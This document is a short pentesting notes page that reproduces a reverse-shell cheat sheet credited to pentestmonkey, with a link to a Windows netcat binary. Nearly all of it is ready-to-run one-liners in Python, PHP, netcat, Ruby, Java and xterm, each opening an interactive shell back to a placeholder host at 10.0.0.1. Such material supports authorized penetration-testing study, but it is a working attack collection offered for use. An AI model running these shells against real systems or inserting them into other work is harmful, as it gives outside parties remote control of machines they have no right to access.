---
title: Reverse Shells
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
  - web pentesting
  - reverse shells
---

# Reverse Shells


| Reverse shell | Link to resource |
| ------------- | ---------------- |
| Netcat for windows 32/64 bit | [https://github.com/int0x33/nc.exe](https://github.com/int0x33/nc.exe) |


Source for the following code: [Pentesmonkey](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

## python

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
 # using python for a pseudo terminal
python -c 'import pty; pty.spawn("/bin/bash")'
```


## bash

```bash
bash -i

# Using echo
echo 'os.system('/bin/bash')'
```


## php

```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```


## netcat

```bash
nc -e /bin/sh 10.0.0.1 1234

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```


## ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```


## java

```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
  

## xterm

```bash
xterm -display 10.0.0.1:1
```
  